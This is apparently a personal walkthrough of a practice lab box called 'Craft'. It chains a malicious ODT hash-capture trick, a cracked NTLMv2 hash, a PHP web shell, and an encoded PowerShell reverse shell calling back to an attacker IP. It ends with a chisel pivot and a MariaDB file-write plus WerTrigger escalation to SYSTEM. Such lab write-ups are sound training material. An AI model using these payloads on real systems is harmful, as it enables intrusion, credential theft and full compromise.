```
nmap -sC -sV -p- 192.168.207.188
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-28 08:40 CDT
Stats: 0:03:22 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.82% done; ETC: 08:44 (0:00:00 remaining)
Nmap scan report for 192.168.207.188
Host is up (0.059s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Craft
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
49666/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 21s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-07-28T13:44:12
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 212.68 seconds
```

Found the upload on the page for a resume. It mentions they are aware of macros. Instead, I opted to use responder to capture the credentials.

https://secureyourit.co.uk/wp/2018/05/01/creating-malicious-odt-files/

Added a photo as an OLE Object. It was the image of a cat. I turned the file into a zip after saving and opened up content.xml

```
http://192.168.45.216/test.jpg
```

I changed cat.jpg to the above and it sent it.

I then got a response from responder:
```
thecybergeek::CRAFT2:0d98a1f629398c12:871E6654FA923BCC26D8E680E7C8161A:01010000000000000013EAFF38C1D90181BF7BC0233B9B310000000002000800470041003200590001001E00570049004E002D005300340054004500540043004B00360035004300440004003400570049004E002D005300340054004500540043004B0036003500430044002E0047004100320059002E004C004F00430041004C000300140047004100320059002E004C004F00430041004C000500140047004100320059002E004C004F00430041004C00070008000013EAFF38C1D90106000400020000000800300030000000000000000000000000300000F6804607C53AA7D4F73061B7A6CFFAE0255C0FE44BAC2EFEC2B04ABC10FFB16B0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200310036000000000000000000
```

Cracked this with hashcat and got: `winniethepooh`

I found I could use smb

```
smbclient //192.168.207.188/webapp -U thecybergeek
Password for [WORKGROUP\thecybergeek]:
Try "help" to get a list of possible commands.
smb: \> put test.php
putting file test.php as \test.php (0.1 kb/s) (average 0.1 kb/s)
smb: \> 

```

Dropped my reverse shell in the webapp directory.

```
http://192.168.207.188/test.php?cmd=powershell%20-nop%20-w%20hidden%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQA2ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```

Sent the reverse shell command and caught it. I then made a change to port and ran it again to have two shells.

```
PS C:\test> .\chisel client 192.168.45.216:3477 R:5000:socks
```

One is going to run chisel to connect to the mysql instance that is running.

```
proxychains mysql -h 127.0.0.1 -u root
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:5000  ...  127.0.0.1:3306  ...  OK
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 8
Server version: 10.4.19-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```

This instance is running as system so we have access to read everything(including the proof). From here, it was best to find a solution to get privilege escalation. MariaDB would get is Privileged File Write so we found WerTrigger from https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#wertrigger

https://github.com/sailay1996/WerTrigger

Used this to do it manually instead of using the binary as I could never get a shell to work.
https://0xdf.gitlab.io/2021/08/21/htb-proper.html

```
MariaDB [(none)]> select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
Query OK, 1 row affected (0.070 sec)
```

```
PS C:\test> dir


    Directory: C:\test


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        7/28/2023   6:24 PM        8676864 chisel.exe                                                            
-a----        7/28/2023   6:25 PM          12288 phoneinfo.dll                                                         
-a----        7/28/2023   6:25 PM           9252 Report.wer                                                            


PS C:\test> mkdir C:\programdata\microsoft\windows\wer\reportqueue\a_b_c_d_e


    Directory: C:\programdata\microsoft\windows\wer\reportqueue


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        7/28/2023   6:25 PM                a_b_c_d_e                                                             


PS C:\test> copy Report.wer C:\programdata\microsoft\windows\wer\reportqueue\a_b_c_d_e\          
PS C:\test> dir C:\programdata\microsoft\windows\wer\reportqueue\a_b_c_d_e


    Directory: C:\programdata\microsoft\windows\wer\reportqueue\a_b_c_d_e


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        7/28/2023   6:25 PM           9252 Report.wer                                                            


PS C:\test> cmd /c SCHTASKS /RUN /TN "Microsoft\Windows\Windows Error Reporting\QueueReporting"
SUCCESS: Attempted to run the scheduled task "Microsoft\Windows\Windows Error Reporting\QueueReporting".
PS C:\test> netstat -ano | findstr 1337
  TCP    127.0.0.1:1337         0.0.0.0:0              LISTENING       1848
PS C:\test> 

```

Once I verified it was listening, I used proxychains to connect to the 1337 port with netcat to get my shell.

```
proxychains nc 127.0.0.1 1337
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:5000  ...  127.0.0.1:1337  ...  OK
whoMicrosoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system
```

I was now system.